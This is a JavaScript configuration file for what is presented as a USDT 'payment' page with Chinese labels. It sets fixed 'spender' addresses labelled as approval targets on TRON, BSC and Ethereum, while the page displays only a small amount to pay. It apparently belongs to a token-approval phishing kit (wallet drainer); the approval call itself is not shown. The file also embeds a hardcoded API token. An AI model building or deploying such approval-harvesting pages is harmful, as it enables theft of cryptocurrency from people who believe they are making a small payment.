(function () {
  var DEFAULT_CONFIG = {
    amountUsdt: "5.00",
    networks: {
      tron: {
        usdtAddress: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
        toAddress: "TA15gtkcGHEUeyAioAbPwdrXD22mpu1CP8" // 授权目标地址 (spender)
      },
      bsc: {
        chainIdHex: "0x38",
        usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
        toAddress: "0xCbEE4A03BAFF04d99F98dDa0B5Aa26d4e6061EED" // 授权目标地址 (spender)
      },
      bscTestnet: {
        chainIdHex: "0x61",
        usdtAddress: "0x25e8a036f3EBEE0Bc13B8213e4425825693A8E95",
        toAddress: "0x699E6785887C20dF58f5CA889E00Ee1fFD67DEA2" // 授权目标地址 (spender)
      },
      eth: {
        chainIdHex: "0x1",
        usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
        toAddress: "0xCbEE4A03BAFF04d99F98dDa0B5Aa26d4e6061EED" // 授权目标地址 (spender)
      }
    }
  };

  var params = new URLSearchParams(window.location.search);
  var amount = params.get("amount") || DEFAULT_CONFIG.amountUsdt;
  var chain = params.get("chain") || params.get("network") || "";
  var to = params.get("to") || params.get("address") || "";
  var apiBase = params.get("apiBase") || "http://localhost:3000";
  var apiToken = params.get("apiToken") || "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiZnJvbnRlbmQiLCJpYXQiOjE3NjgzNzMxMDUsImV4cCI6MTc2ODk3NzkwNX0.9mv7p-ABjqLxfYS-Vu7OO3umOvzbxNndbMg9ksVH72U";

  window.pay0Config = {
    amountUsdt: amount,
    chain: chain,
    toAddress: to, 
    apiBase: apiBase,
    apiToken: apiToken,
    networks: DEFAULT_CONFIG.networks,
    
    getNetworkConfig: function(networkKey) {
      var net = this.networks[networkKey];
      if (!net) return null;

      var finalTo = this.toAddress || net.toAddress;
      return {
        chainIdHex: net.chainIdHex,
        usdtAddress: net.usdtAddress,
        toAddress: finalTo
      };
    }
  };

  window.addEventListener("DOMContentLoaded", function() {
    var t1 = document.getElementById("amountText");
    var t2 = document.getElementById("amountText2");
    var netEl = document.getElementById("networkText");
    var toEl = document.getElementById("toAddressText");

    if (t1) t1.textContent = amount;
    if (t2) t2.textContent = amount;
    
    var chainLabel = "自动匹配钱包网络";
    if (chain) {
      var c = chain.toLowerCase();
      if (c === "tron" || c === "trc20") chainLabel = "TRON 主网 (TRC20)";
      else if (c === "bsc" || c === "bep20") chainLabel = "BSC 主网 (BEP20)";
      else if (c === "eth" || c === "erc20" || c === "ethereum") chainLabel = "Ethereum 主网 (ERC20)";
    }
    if (netEl) netEl.textContent = chainLabel;
    
    if (toEl) {
      if (to) {
        toEl.textContent = to;
      } else {
         toEl.textContent = "根据钱包网络自动匹配";
      }
    }
  });

})();
